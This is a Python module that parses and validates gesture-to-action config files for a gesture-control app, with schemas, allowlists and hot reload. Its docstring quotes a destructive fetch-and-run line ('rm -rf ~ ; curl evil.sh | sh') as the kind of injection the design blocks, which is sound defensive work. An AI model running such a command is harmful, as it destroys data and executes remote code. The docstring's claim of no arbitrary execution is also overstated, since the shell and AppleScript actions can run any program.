"""Declarative gesture → action bindings.

Replaces the hardcoded GESTURE_MAP dict.  Bindings now live in a YAML (or JSON)
file the user owns, which is also the artifact the web command builder exports.

Design constraints
------------------
**No arbitrary code execution.**  Every action is one of a closed set of typed
kinds, each validated against a schema before anything runs.  There is no
`eval`, no `exec`, and no shell-string action -- `shell` takes an argv *list*
and is executed without a shell, so a config file cannot smuggle in
`rm -rf ~ ; curl evil.sh | sh` through a quoting trick.  A config file is
untrusted input: it may arrive by download from a website, and it is validated
like untrusted input.

**Fail loudly at load, never at gesture time.**  A typo in a key name should
stop startup with a message naming the gesture and the field, not silently
produce a gesture that does nothing when performed six minutes later.

Format
------
::

    version: 1
    neutral_label: 0
    gestures:
      - label: 1
        name: Spotlight
        description: Open Spotlight search
        action:
          type: hotkey
          keys: [command, space]
"""

from __future__ import annotations

import json
import re
import threading
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional

from gestureflow.utils import PROJECT_ROOT

SCHEMA_VERSION = 2

# Gestures that are detected geometrically rather than classified by the model,
# and so are bound by name instead of by model label.
NAMED_GESTURES = frozenset({
    "swipe_left", "swipe_right",
    "zoom_in", "zoom_out",
})

DEFAULT_COMMANDS_PATH = PROJECT_ROOT / "configs" / "commands.default.yaml"
USER_COMMANDS_PATH = Path.home() / ".gestureflow" / "commands.yaml"

# Keys pyautogui.hotkey / press accept. Restricting to a known set means a
# typo is a load-time error rather than a hotkey that silently does nothing.
VALID_KEYS = frozenset({
    "command", "cmd", "ctrl", "control", "alt", "option", "shift", "fn",
    "enter", "return", "tab", "space", "esc", "escape", "backspace", "delete",
    "up", "down", "left", "right", "home", "end", "pageup", "pagedown",
    "capslock", "insert",
    *(f"f{i}" for i in range(1, 21)),
    *"abcdefghijklmnopqrstuvwxyz",
    *"0123456789",
    "-", "=", "[", "]", "\\", ";", "'", ",", ".", "/", "`",
})

MEDIA_ACTIONS = frozenset({
    "playpause", "next", "previous",
    "volumeup", "volumedown", "mute",
})

ACTION_TYPES = frozenset({
    "hotkey", "keypress", "media", "launch", "applescript", "shell",
    "url", "text", "chord",
})

# Only schemes that open a browser. javascript:, file: and data: are the ones
# worth naming: the first executes in whatever page is open, the second reads
# local files, the third smuggles a whole document inline. A config can arrive
# by download, so the allowlist is the whole defence.
URL_SCHEMES = frozenset({"http", "https"})
MAX_URL_LENGTH = 2000

# Typed one character at a time rather than pasted, so the user's clipboard is
# left alone. That makes long text slow, hence the cap.
MAX_TEXT_LENGTH = 500
MAX_CHORD_STEPS = 12
MAX_CHORD_DELAY = 2.0

_APP_NAME_RE = re.compile(r"^[A-Za-z0-9 ._+-]{1,64}$")


class CommandConfigError(ValueError):
    """Raised when a command config is malformed. Message names the culprit."""


# ---------------------------------------------------------------------------
# Action model
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class ChordStep:
    keys: tuple
    delay: float = 0.05

    def to_dict(self) -> Dict[str, Any]:
        return {"keys": list(self.keys), "delay": self.delay}


@dataclass(frozen=True)
class Action:
    type: str
    keys: tuple = ()
    key: str = ""
    media: str = ""
    app: str = ""
    script: str = ""
    argv: tuple = ()
    url: str = ""
    text: str = ""
    steps: tuple = ()

    def to_dict(self) -> Dict[str, Any]:
        if self.type == "hotkey":
            return {"type": "hotkey", "keys": list(self.keys)}
        if self.type == "keypress":
            return {"type": "keypress", "key": self.key}
        if self.type == "media":
            return {"type": "media", "action": self.media}
        if self.type == "launch":
            return {"type": "launch", "app": self.app}
        if self.type == "applescript":
            return {"type": "applescript", "script": self.script}
        if self.type == "shell":
            return {"type": "shell", "argv": list(self.argv)}
        if self.type == "url":
            return {"type": "url", "url": self.url}
        if self.type == "text":
            return {"type": "text", "text": self.text}
        if self.type == "chord":
            return {"type": "chord",
                    "steps": [step.to_dict() for step in self.steps]}
        raise CommandConfigError(f"unknown action type {self.type!r}")

    def describe(self) -> str:
        if self.type == "hotkey":
            return " + ".join(self.keys)
        if self.type == "keypress":
            return f"press {self.key}"
        if self.type == "media":
            return f"media: {self.media}"
        if self.type == "launch":
            return f"open {self.app}"
        if self.type == "applescript":
            first = self.script.strip().splitlines()[0] if self.script else ""
            return f"applescript: {first[:40]}"
        if self.type == "shell":
            return "shell: " + " ".join(self.argv)
        if self.type == "url":
            return f"open {self.url}"
        if self.type == "text":
            preview = self.text if len(self.text) <= 24 else self.text[:21] + "..."
            return f"type {preview!r}"
        if self.type == "chord":
            return " then ".join(" + ".join(step.keys) for step in self.steps)
        return self.type


@dataclass(frozen=True)
class Binding:
    """One gesture bound to one action.

    Keyed either by model `label` (a classified pose) or by `gesture` name (a
    geometric detector). Exactly one of the two, never both.
    """
    name: str
    action: Action
    label: Optional[int] = None
    gesture: Optional[str] = None
    description: str = ""

    @property
    def key(self):
        return self.label if self.label is not None else self.gesture

    def to_dict(self) -> Dict[str, Any]:
        out: Dict[str, Any] = {}
        if self.label is not None:
            out["label"] = self.label
        else:
            out["gesture"] = self.gesture
        out["name"] = self.name
        if self.description:
            out["description"] = self.description
        out["action"] = self.action.to_dict()
        return out


@dataclass(frozen=True)
class Profile:
    """A set of bindings that applies when a matching app is frontmost."""

    name: str
    apps: tuple = ()
    commands: CommandSet = None

    def matches(self, app: Optional[str]) -> bool:
        if app is None:
            return False
        needle = app.strip().lower()
        return any(needle == candidate for candidate in self.apps)


@dataclass
class CommandSet:
    """An immutable-ish set of gesture bindings, keyed by model label."""

    bindings: Dict[int, Binding] = field(default_factory=dict)
    named: Dict[str, Binding] = field(default_factory=dict)
    neutral_label: int = 0
    source: Optional[Path] = None
    version: int = SCHEMA_VERSION
    profiles: tuple = ()

    def has(self, label: int) -> bool:
        return int(label) in self.bindings

    def get(self, label: int) -> Optional[Binding]:
        return self.bindings.get(int(label))

    def name_for(self, label: int) -> str:
        binding = self.get(label)
        return binding.name if binding else f"gesture {label}"

    def labels(self) -> List[int]:
        return sorted(self.bindings)

    def has_named(self, gesture: str) -> bool:
        return gesture in self.named

    def get_named(self, gesture: str) -> Optional[Binding]:
        return self.named.get(gesture)

    def gesture_names(self) -> List[str]:
        return sorted(self.named)

    def to_dict(self) -> Dict[str, Any]:
        entries = [self.bindings[label].to_dict() for label in self.labels()]
        entries += [self.named[name].to_dict() for name in self.gesture_names()]
        out: Dict[str, Any] = {
            "version": self.version,
            "neutral_label": self.neutral_label,
            "gestures": entries,
        }
        if self.profiles:
            out["profiles"] = [
                {
                    "name": profile.name,
                    "match": {"apps": list(profile.apps)},
                    "gestures": profile.commands.to_dict()["gestures"],
                }
                for profile in self.profiles
            ]
        return out

    def overlay(self, other: CommandSet) -> CommandSet:
        """This set with `other`'s bindings layered on top.

        A profile states only what it changes. Anything it does not mention
        keeps working exactly as it does by default, which is what makes a
        profile a small edit rather than a second whole config to maintain.
        """
        bindings = dict(self.bindings)
        bindings.update(other.bindings)
        named = dict(self.named)
        named.update(other.named)
        return CommandSet(bindings=bindings, named=named,
                          neutral_label=self.neutral_label,
                          source=self.source, version=self.version,
                          profiles=self.profiles)

    def resolve(self, app: Optional[str]) -> CommandSet:
        """The bindings that apply while `app` is frontmost.

        First match wins, so config order is the tie-breaker and a user can
        reason about precedence by reading top to bottom.
        """
        for profile in self.profiles:
            if profile.matches(app):
                return self.overlay(profile.commands)
        return self

    def profile_for(self, app: Optional[str]) -> Optional[str]:
        for profile in self.profiles:
            if profile.matches(app):
                return profile.name
        return None

    def to_yaml(self) -> str:
        return dump_yaml(self.to_dict())


# ---------------------------------------------------------------------------
# Validation
# ---------------------------------------------------------------------------

def _require(condition: bool, message: str) -> None:
    if not condition:
        raise CommandConfigError(message)


def parse_action(raw: Any, where: str) -> Action:
    _require(isinstance(raw, dict), f"{where}: 'action' must be a mapping")

    kind = raw.get("type")
    _require(isinstance(kind, str) and kind,
             f"{where}: 'action.type' is required")
    _require(kind in ACTION_TYPES,
             f"{where}: unknown action type {kind!r}. "
             f"Valid types: {', '.join(sorted(ACTION_TYPES))}")

    if kind == "hotkey":
        keys = raw.get("keys")
        _require(isinstance(keys, (list, tuple)) and len(keys) >= 1,
                 f"{where}: hotkey needs a non-empty 'keys' list")
        _require(len(keys) <= 5,
                 f"{where}: hotkey accepts at most 5 keys, got {len(keys)}")
        normalized = []
        for k in keys:
            _require(isinstance(k, str), f"{where}: hotkey keys must be strings")
            low = k.strip().lower()
            _require(low in VALID_KEYS,
                     f"{where}: {k!r} is not a recognized key name")
            normalized.append(low)
        return Action(type="hotkey", keys=tuple(normalized))

    if kind == "keypress":
        key = raw.get("key")
        _require(isinstance(key, str) and key.strip(),
                 f"{where}: keypress needs a 'key'")
        low = key.strip().lower()
        _require(low in VALID_KEYS, f"{where}: {key!r} is not a recognized key")
        return Action(type="keypress", key=low)

    if kind == "media":
        media = raw.get("action")
        _require(isinstance(media, str), f"{where}: media needs an 'action'")
        low = media.strip().lower()
        _require(low in MEDIA_ACTIONS,
                 f"{where}: unknown media action {media!r}. "
                 f"Valid: {', '.join(sorted(MEDIA_ACTIONS))}")
        return Action(type="media", media=low)

    if kind == "launch":
        app = raw.get("app")
        _require(isinstance(app, str) and app.strip(),
                 f"{where}: launch needs an 'app' name")
        app = app.strip()
        # Anchored character-class match: an app name cannot contain quotes,
        # semicolons, or newlines that would change the meaning of the
        # `open -a` invocation it ends up in.
        _require(bool(_APP_NAME_RE.match(app)),
                 f"{where}: {app!r} is not a valid application name "
                 f"(letters, digits, spaces, . _ + - only)")
        return Action(type="launch", app=app)

    if kind == "applescript":
        script = raw.get("script")
        _require(isinstance(script, str) and script.strip(),
                 f"{where}: applescript needs a 'script'")
        _require(len(script) <= 4000,
                 f"{where}: applescript is longer than the 4000-char limit")
        return Action(type="applescript", script=script)

    if kind == "url":
        url = raw.get("url")
        _require(isinstance(url, str) and url.strip(),
                 f"{where}: url needs a 'url'")
        url = url.strip()
        _require(len(url) <= MAX_URL_LENGTH,
                 f"{where}: url is longer than the {MAX_URL_LENGTH}-char limit")
        scheme = url.split(":", 1)[0].lower() if ":" in url else ""
        _require(scheme in URL_SCHEMES,
                 f"{where}: {url!r} must start with http:// or https://. "
                 f"Other schemes are rejected -- javascript: would run in "
                 f"whatever page is open, and file: would read local files.")
        _require("\n" not in url and "\r" not in url,
                 f"{where}: a url cannot contain line breaks")
        return Action(type="url", url=url)

    if kind == "text":
        text = raw.get("text")
        _require(isinstance(text, str) and text,
                 f"{where}: text needs a 'text' value")
        _require(len(text) <= MAX_TEXT_LENGTH,
                 f"{where}: text is longer than the {MAX_TEXT_LENGTH}-char "
                 f"limit. It is typed one character at a time so the clipboard "
                 f"is left alone, which makes long text slow.")
        # Tabs and newlines are real keystrokes with real effects (moving focus,
        # submitting forms). Other control characters are not typeable at all.
        bad = [c for c in text if ord(c) < 32 and c not in "\t\n"]
        _require(not bad,
                 f"{where}: text contains control characters that cannot be "
                 f"typed: {[hex(ord(c)) for c in bad[:3]]}")
        return Action(type="text", text=text)

    if kind == "chord":
        steps = raw.get("steps")
        _require(isinstance(steps, (list, tuple)) and steps,
                 f"{where}: chord needs a non-empty 'steps' list")
        _require(len(steps) <= MAX_CHORD_STEPS,
                 f"{where}: chord is limited to {MAX_CHORD_STEPS} steps")

        parsed = []
        for n, step in enumerate(steps):
            at = f"{where}: chord step {n + 1}"
            _require(isinstance(step, dict), f"{at} must be a mapping")

            keys = step.get("keys")
            _require(isinstance(keys, (list, tuple)) and keys,
                     f"{at}: needs a non-empty 'keys' list")
            _require(len(keys) <= 5, f"{at}: at most 5 keys")
            normalized = []
            for k in keys:
                _require(isinstance(k, str), f"{at}: keys must be strings")
                low = k.strip().lower()
                _require(low in VALID_KEYS,
                         f"{at}: {k!r} is not a recognized key name")
                normalized.append(low)

            delay = step.get("delay", 0.05)
            _require(isinstance(delay, (int, float)) and not isinstance(delay, bool),
                     f"{at}: 'delay' must be a number")
            _require(0.0 <= delay <= MAX_CHORD_DELAY,
                     f"{at}: 'delay' must be between 0 and {MAX_CHORD_DELAY} "
                     f"seconds -- a longer pause would block the action thread")
            parsed.append(ChordStep(keys=tuple(normalized), delay=float(delay)))

        return Action(type="chord", steps=tuple(parsed))

    # kind == "shell"
    argv = raw.get("argv")
    _require(isinstance(argv, (list, tuple)) and len(argv) >= 1,
             f"{where}: shell needs a non-empty 'argv' list. "
             f"Note this is an argument list, not a command string -- "
             f"it is run without a shell, so pipes and redirects do not apply.")
    _require(all(isinstance(a, str) for a in argv),
             f"{where}: every argv entry must be a string")
    _require(len(argv) <= 32, f"{where}: argv is limited to 32 entries")
    return Action(type="shell", argv=tuple(argv))


def parse_commands(raw: Any, source: Optional[Path] = None) -> CommandSet:
    """Validate a parsed config document into a CommandSet."""
    where = f"{source}" if source else "<config>"
    _require(isinstance(raw, dict), f"{where}: top level must be a mapping")

    version = raw.get("version", SCHEMA_VERSION)
    _require(isinstance(version, int),
             f"{where}: 'version' must be an integer")
    # Version 1 configs stay loadable. They simply have no named-gesture
    # bindings, which is exactly what an empty `named` map means -- so nothing
    # in the loader has to branch on the version beyond accepting it.
    _require(1 <= version <= SCHEMA_VERSION,
             f"{where}: config version {version} is not supported by this "
             f"build (this build understands 1..{SCHEMA_VERSION})")

    neutral = raw.get("neutral_label", 0)
    _require(isinstance(neutral, int) and neutral >= 0,
             f"{where}: 'neutral_label' must be a non-negative integer")

    gestures = raw.get("gestures")
    _require(isinstance(gestures, list) and gestures,
             f"{where}: 'gestures' must be a non-empty list")

    bindings, named = _parse_gesture_list(gestures, where, neutral, version)

    profiles = _parse_profiles(raw.get("profiles"), where, neutral, version)

    return CommandSet(bindings=bindings, named=named, neutral_label=neutral,
                      source=source, version=version, profiles=profiles)


def _parse_profiles(raw: Any, where: str, neutral: int,
                    version: int) -> tuple:
    if raw is None:
        return ()
    _require(isinstance(raw, list) and raw,
             f"{where}: 'profiles' must be a non-empty list when present")
    _require(version >= 2,
             f"{where}: profiles need config version 2 or later")

    profiles = []
    seen = set()
    for i, entry in enumerate(raw):
        item = f"{where}: profiles[{i}]"
        _require(isinstance(entry, dict), f"{item} must be a mapping")

        name = entry.get("name")
        _require(isinstance(name, str) and name.strip(),
                 f"{item}: 'name' is required")
        name = name.strip()
        _require(name.lower() not in seen,
                 f"{item}: a profile named {name!r} is already defined")
        seen.add(name.lower())

        match = entry.get("match")
        _require(isinstance(match, dict), f"{item}: 'match' must be a mapping")
        apps = match.get("apps")
        _require(isinstance(apps, list) and apps,
                 f"{item}: 'match.apps' must be a non-empty list of "
                 f"application names")
        normalized = []
        for app in apps:
            _require(isinstance(app, str) and app.strip(),
                     f"{item}: application names must be non-empty strings")
            normalized.append(app.strip().lower())

        gestures = entry.get("gestures")
        _require(isinstance(gestures, list) and gestures,
                 f"{item}: 'gestures' must be a non-empty list. A profile that "
                 f"overrides nothing does nothing.")
        bindings, named = _parse_gesture_list(
            gestures, f"{item} ({name})", neutral, version)

        profiles.append(Profile(
            name=name,
            apps=tuple(normalized),
            commands=CommandSet(bindings=bindings, named=named,
                                neutral_label=neutral, version=version),
        ))
    return tuple(profiles)


def _parse_gesture_list(gestures: Any, where: str, neutral: int,
                        version: int) -> tuple:
    bindings: Dict[int, Binding] = {}
    named: Dict[str, Binding] = {}

    for i, entry in enumerate(gestures):
        item = f"{where}: gestures[{i}]"
        _require(isinstance(entry, dict), f"{item} must be a mapping")

        has_label = "label" in entry
        has_gesture = "gesture" in entry
        _require(has_label or has_gesture,
                 f"{item}: needs either a 'label' (a pose the model predicts) "
                 f"or a 'gesture' (a geometric gesture, one of "
                 f"{', '.join(sorted(NAMED_GESTURES))})")
        _require(not (has_label and has_gesture),
                 f"{item}: has both 'label' and 'gesture'; a binding is keyed "
                 f"by one or the other, not both")

        name = entry.get("name")
        _require(isinstance(name, str) and name.strip(),
                 f"{item}: 'name' is required")
        _require(len(name) <= 64, f"{item}: 'name' is limited to 64 characters")

        description = entry.get("description", "")
        _require(isinstance(description, str),
                 f"{item}: 'description' must be a string")

        action = parse_action(entry.get("action"), f"{item} ({name})")

        if has_gesture:
            gesture = entry.get("gesture")
            _require(isinstance(gesture, str),
                     f"{item}: 'gesture' must be a string")
            _require(gesture in NAMED_GESTURES,
                     f"{item}: unknown gesture {gesture!r}. Valid: "
                     f"{', '.join(sorted(NAMED_GESTURES))}")
            _require(version >= 2,
                     f"{item}: named gestures need config version 2 or later; "
                     f"this file declares version {version}")
            _require(gesture not in named,
                     f"{item}: gesture {gesture!r} is already bound to "
                     f"{named[gesture].name!r}" if gesture in named else "")
            named[gesture] = Binding(name=name.strip(), action=action,
                                     gesture=gesture,
                                     description=description.strip())
            continue

        label = entry.get("label")
        _require(isinstance(label, int) and not isinstance(label, bool),
                 f"{item}: 'label' must be an integer")
        _require(label >= 0, f"{item}: 'label' must be non-negative")
        _require(label != neutral,
                 f"{item}: label {label} is the neutral label, which is the "
                 f"'no gesture' state and cannot have an action bound to it")
        _require(label not in bindings,
                 f"{item}: label {label} is already bound to "
                 f"{bindings[label].name!r}" if label in bindings else "")
        bindings[label] = Binding(name=name.strip(), action=action,
                                  label=label,
                                  description=description.strip())

    return bindings, named


# ---------------------------------------------------------------------------
# Loading
# ---------------------------------------------------------------------------

def _parse_document(text: str, path: Path) -> Any:
    if path.suffix.lower() == ".json":
        try:
            return json.loads(text)
        except json.JSONDecodeError as exc:
            raise CommandConfigError(f"{path}: invalid JSON — {exc}") from exc

    try:
        import yaml
    except ImportError as exc:
        raise CommandConfigError(
            f"{path}: PyYAML is required to read YAML configs. "
            f"Install it with 'pip install pyyaml', or use a .json config."
        ) from exc

    try:
        # safe_load, never load: a config file must not be able to construct
        # arbitrary Python objects.
        return yaml.safe_load(text)
    except yaml.YAMLError as exc:
        raise CommandConfigError(f"{path}: invalid YAML — {exc}") from exc


def resolve_commands_path(explicit: Optional[Path] = None) -> Path:
    """Pick the config to load: explicit > user's > shipped default."""
    if explicit is not None:
        path = Path(explicit).expanduser()
        if not path.exists():
            raise CommandConfigError(f"No command config at {path}")
        return path
    if USER_COMMANDS_PATH.exists():
        return USER_COMMANDS_PATH
    return DEFAULT_COMMANDS_PATH


def load_commands(path: Optional[Path] = None) -> CommandSet:
    resolved = resolve_commands_path(path)
    if not resolved.exists():
        raise CommandConfigError(
            f"No command config found. Expected one of:\n"
            f"  {USER_COMMANDS_PATH}\n"
            f"  {DEFAULT_COMMANDS_PATH}"
        )
    text = resolved.read_text()
    return parse_commands(_parse_document(text, resolved), source=resolved)


def load_commands_from_string(text: str, fmt: str = "yaml") -> CommandSet:
    """Parse a config held in memory. Used by the bridge and by tests."""
    if fmt == "json":
        raw = json.loads(text)
    else:
        import yaml
        raw = yaml.safe_load(text)
    return parse_commands(raw, source=None)


class CommandReloader:
    """Reloads the command config when its file changes on disk.

    mtime polling rather than filesystem events: one `stat` a second is
    cheaper than a watcher dependency, and the reaction time a human needs
    after saving a file is nowhere near a second.
    """

    def __init__(self, path: Path, interval: float = 1.0) -> None:
        self.path = Path(path)
        self.interval = interval
        self._lock = threading.Lock()
        self._mtime = self._current_mtime()
        self._commands = load_commands(self.path)
        self._last_check = 0.0

    def _current_mtime(self) -> float:
        try:
            return self.path.stat().st_mtime
        except OSError:
            return 0.0

    @property
    def commands(self) -> CommandSet:
        with self._lock:
            return self._commands

    def poll(self, now: float) -> bool:
        """Reload if the file changed. Returns True if it did."""
        if now - self._last_check < self.interval:
            return False
        self._last_check = now

        mtime = self._current_mtime()
        if mtime == self._mtime:
            return False

        try:
            fresh = load_commands(self.path)
        except CommandConfigError as exc:
            # Keep running the last config that parsed. Swapping in a broken
            # config, or exiting, would both be worse than ignoring the edit.
            print(f"[commands] Reload failed, keeping previous config: {exc}")
            self._mtime = mtime
            return False

        with self._lock:
            self._commands = fresh
        self._mtime = mtime
        print(f"[commands] Reloaded {self.path}")
        return True


# ---------------------------------------------------------------------------
# Serialization
# ---------------------------------------------------------------------------

def dump_yaml(data: Dict[str, Any]) -> str:
    try:
        import yaml
    except ImportError:
        return json.dumps(data, indent=2)
    return yaml.safe_dump(data, sort_keys=False, default_flow_style=False)
